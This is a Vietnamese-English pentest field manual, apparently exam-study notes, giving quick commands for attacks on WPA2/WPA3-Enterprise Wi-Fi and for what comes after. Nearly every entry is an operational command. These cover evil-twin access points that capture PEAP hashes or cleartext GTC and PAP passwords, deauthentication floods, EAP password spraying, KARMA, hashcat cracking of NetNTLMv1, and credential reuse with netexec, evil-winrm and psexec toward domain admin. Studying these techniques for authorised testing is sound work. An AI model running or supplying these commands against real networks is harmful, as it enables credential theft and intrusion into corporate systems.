---
title: "Field Manual"
tags: [pentest, wireless, wpa2-enterprise, field-manual, reference]
created: 2026-04-01
---

> **Mục đích**: Tài liệu tra cứu nhanh trong thi — mỗi lesson thêm một entry.
> **Cách dùng**: Ctrl+F technique name → xem lệnh nhanh, điều kiện, và link về lesson đầy đủ.

---

## Wireless Enterprise Attacks

#### Wireless Recon (MGT Networks)
- **Condition**: Cần identify WPA Enterprise APs và connected clients trong range
- **Quick command**: `sudo airodump-ng wlan0mon --encrypt WPA`
- **Full flow**: `airmon-ng start wlan0` → `airodump-ng wlan0mon` → lọc AUTH=MGT → `airodump-ng -c <ch> --bssid <BSSID> -w capture wlan0mon`
- **Look for**: Cột AUTH=MGT trong airodump output; EAP-Request/Identity frames trong Wireshark
- **Ref**: [[03-wireless-recon-eap-fingerprinting|03. Wireless Recon & EAP Fingerprinting]]

#### Evil Twin + PEAP Hash Capture
- **Condition**: WPA2-Enterprise network dùng PEAP/MSCHAPv2; clients không enforce cert validation
- **Quick command**: `./eaphammer -i wlan0 --channel 6 --auth peap --essid CorpWifi --creds`
- **Full flow**: `eaphammer --cert-wizard` → `aireplay-ng -0 50 -a <BSSID> wlan0mon` → chờ client kết nối → capture NetNTLMv1 hash → `hashcat -m 5500 hash.txt rockyou.txt`
- **Look for**: `mschapv2: username: jdoe challenge: ... response: ...` trong eaphammer output
- **Ref**: [[04-evil-twin-rogue-radius-peap|04. Evil Twin: Rogue RADIUS + PEAP Hash Capture]]

#### EAP-GTC Downgrade (Cleartext Password)
- **Condition**: PEAP network; client không enforce inner auth method; eap_user file cho phép GTC
- **Quick command**: `./eaphammer -i wlan0 --channel 6 --auth peap --essid CorpWifi --creds --negotiate gtc`
- **Full flow**: Setup eaphammer với GTC priority trong eap_user → deauth clients → capture cleartext → no crack needed
- **Look for**: `gtc: username: jdoe password: Password123` trong hostapd-wpe log
- **Ref**: [[05-eap-downgrade-gtc-cleartext|05. EAP Downgrade: GTC Cleartext Capture]]

#### EAP-TTLS/PAP Cleartext Capture
- **Condition**: Network dùng EAP-TTLS với PAP inner auth (corporate với legacy systems)
- **Quick command**: `berate_ap -n wlan0 CorpWifi --eap --mana-wpe --mana-credout creds.txt`
- **Full flow**: `berate_ap` với EAP-TTLS + PAP priority → deauth → client connects → PAP password captured cleartext
- **Look for**: PAP credentials in cleartext trong hostapd-mana log / creds.txt
- **Ref**: [[06-eap-ttls-pap-attack|06. EAP-TTLS/PAP: Cleartext via Inner Auth]]

#### EAPHammer EAP Spray (Online Brute Force)
- **Condition**: WPA-Enterprise network với large user base; có wordlist usernames + common passwords
- **Quick command**: `./eaphammer --eap-spray -i wlan0 --essid CorpWifi --user-list users.txt --password Password1`
- **Full flow**: Collect usernames (OSINT/LinkedIn) → `eaphammer --eap-spray` với common passwords → valid creds logged
- **Look for**: `[+] Found credentials: jdoe:Password1` trong eaphammer output
- **Ref**: [[07-eaphammer-toolkit|07. EAPHammer Toolkit Mastery]]

#### KARMA / Known Beacons Attack
- **Condition**: Nhiều clients đang probe cho saved networks; không cần biết target SSID trước
- **Quick command**: `./eaphammer -i wlan0 --creds --karma --auth peap`
- **Full flow**: Enable KARMA mode → AP responds to all probe requests → clients auto-connect → EAP credential capture
- **Look for**: Multiple clients connecting với nhiều SSIDs khác nhau → harvest EAP creds từ tất cả
- **Ref**: [[08-karma-known-beacons|08. KARMA & Known Beacons Attack]]

#### WPA3 EAP-PWD Attack (Dragonblood)
- **Condition**: WPA3-Enterprise network dùng EAP-PWD; unpatched firmware
- **Quick command**: `eaphammer -i wlan0 --auth eap-pwd --essid CorpWifi3 --creds`
- **Full flow**: Recon WPA3 AP → Evil Twin với EAP-PWD → side-channel timing attack → offline dictionary attack
- **Look for**: EAP-PWD exchange captured; timing data collectible với dragonblood tools
- **Ref**: [[09-wpa3-eap-pwd-owe|09. WPA3 Enterprise: EAP-PWD & OWE Attacks]]

#### Post-Exploitation — Domain Credential Reuse
- **Condition**: Đã có domain username:password từ wireless capture
- **Quick command**: `nxc smb <DC_IP> -u jdoe -p 'Password123' --shares`
- **Full flow**: `nxc smb <SUBNET>/24 -u user -p pass` → identify domain machines → `evil-winrm` / `psexec.py` nếu local admin → BloodHound enum → path to DA
- **Look for**: `[+] <IP> (name:<hostname>) (domain:<DOMAIN>) - Pwn3d!` trong netexec output
- **Ref**: [[10-post-exploitation-credential-reuse|10. Post-Exploitation: Credential Reuse & Lateral Movement]]

---

## Password & Hash Attacks

#### NetNTLMv1 Crack (PEAP/MSCHAPv2)
- **Condition**: Đã capture NetNTLMv1 hash từ Evil Twin attack
- **Quick command**: `hashcat -m 5500 netntlmv1.txt rockyou.txt`
- **Full flow**: Extract hash từ hostapd-wpe log → format `user::domain:challenge:response:challenge` → `hashcat -m 5500` → cracked plaintext
- **Look for**: `jdoe::CORP:challenge:response → Password123` trong hashcat output
- **Ref**: [[04-evil-twin-rogue-radius-peap|04. Evil Twin: Rogue RADIUS + PEAP Hash Capture]]

---

## Tools Reference

#### EAPHammer
- **Condition**: All-in-one evil twin attacks against WPA/WPA2/WPA3 Enterprise
- **Quick command**: `./eaphammer --cert-wizard && ./eaphammer -i wlan0 --essid TARGET --auth peap --creds`
- **Full flow**: `--cert-wizard` (generate cert) → `-i wlan0 --channel N --auth peap --essid SSID --creds` → monitor output
- **Look for**: MSCHAPv2 challenge/response hoặc GTC cleartext trong console output
- **Ref**: [[07-eaphammer-toolkit|07. EAPHammer Toolkit Mastery]]

---

*Field Manual được cập nhật tự động sau mỗi lesson. KHÔNG edit thủ công phần trên — chỉ thêm entries vào các sections.*
